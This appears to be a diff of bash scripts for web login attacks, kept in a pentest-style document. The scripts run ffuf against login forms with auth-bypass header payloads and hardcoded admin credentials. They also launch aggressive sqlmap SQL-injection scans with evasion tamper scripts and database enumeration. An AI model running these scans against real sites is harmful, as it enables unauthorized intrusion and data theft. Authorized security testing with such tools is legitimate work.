@@ -219,7 +219,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
-DEPS="git seclists golang ffuf"
+DEPS="git curl golang ffuf"
 
 # Install Katana
 if ! command -v katana &>/dev/null; then
@@ -304,7 +304,7 @@ if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
 fi
 
 # Prepre POST Data
-DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
+DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=12341234@"
 [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
 # Extract Cookies
@@ -334,7 +334,7 @@ HEADERS=(
 )
 
 # Auth Bypass Header
-payload_list="payloads.txt"
+payload_list="/tmp/payloads.txt"
 cat > $payload_list << EOF
 authenticated=yes
 authenticated=true
@@ -426,7 +426,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
-DEPS="git seclists golang ffuf sqlmap"
+DEPS="git curl golang ffuf sqlmap"
 
 # Install Katana
 if ! command -v katana &>/dev/null; then
@@ -511,7 +511,7 @@ if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
 fi
 
 # Prepre POST Data
-DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=admin12341234"
+DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=12341234@"
 [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
 # Extract Cookies
@@ -540,24 +540,24 @@ Priority: u=0, i"
 if [[ "$METHOD" == "get" ]]; then
     SQLMAP_URL="${FULL_ACTION}?${DATA}"
     sqlmap -u "$SQLMAP_URL" \
-        --headers="$SQLMAP_HEADERS" \
-        --cookie="$COOKIES" \
-        --batch --level=5 --risk=3 -v 3 \
-        --random-agent --threads=10 \
-        --tamper=space2comment,randomcase \
-        --not-string="invalid\|incorrect\|failed\|error\|denied" \
-        --dbs --banner --current-user --current-db --is-dba
+           --headers="$SQLMAP_HEADERS" \
+           --cookie="$COOKIES" \
+           --batch --level=5 --risk=3 -v 3 \
+           --random-agent --threads=10 \
+           --tamper=space2comment,randomcase \
+           --not-string="invalid\|incorrect\|failed\|error\|denied" \
+           --dbs --banner --current-user --current-db --is-dba
 
 else
     sqlmap -u "$FULL_ACTION" \
-        --data="$DATA" \
-        --headers="$SQLMAP_HEADERS" \
-        --cookie="$COOKIES" \
-        --batch --level=5 --risk=3 -v 3 \
-        --random-agent --threads=10 \
-        --tamper=space2comment,randomcase \
-        --not-string="invalid\|incorrect\|failed\|error\|denied" \
-        --dbs --banner --current-user --current-db --is-dba
+           --data="$DATA" \
+           --headers="$SQLMAP_HEADERS" \
+           --cookie="$COOKIES" \
+           --batch --level=5 --risk=3 -v 3 \
+           --random-agent --threads=10 \
+           --tamper=space2comment,randomcase \
+           --not-string="invalid\|incorrect\|failed\|error\|denied" \
+           --dbs --banner --current-user --current-db --is-dba
 fi
 ```
 
@@ -598,7 +598,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
-DEPS="git seclists golang ffuf"
+DEPS="git curl golang ffuf"
 
 # Install Katana
 if ! command -v katana &>/dev/null; then
@@ -713,7 +713,7 @@ HEADERS=(
 )
 
 # Auth Bypass Header
-payload_list="payloads.txt"
+payload_list="/tmp/payloads.txt"
 cat > $payload_list << EOF
 0
 0e0
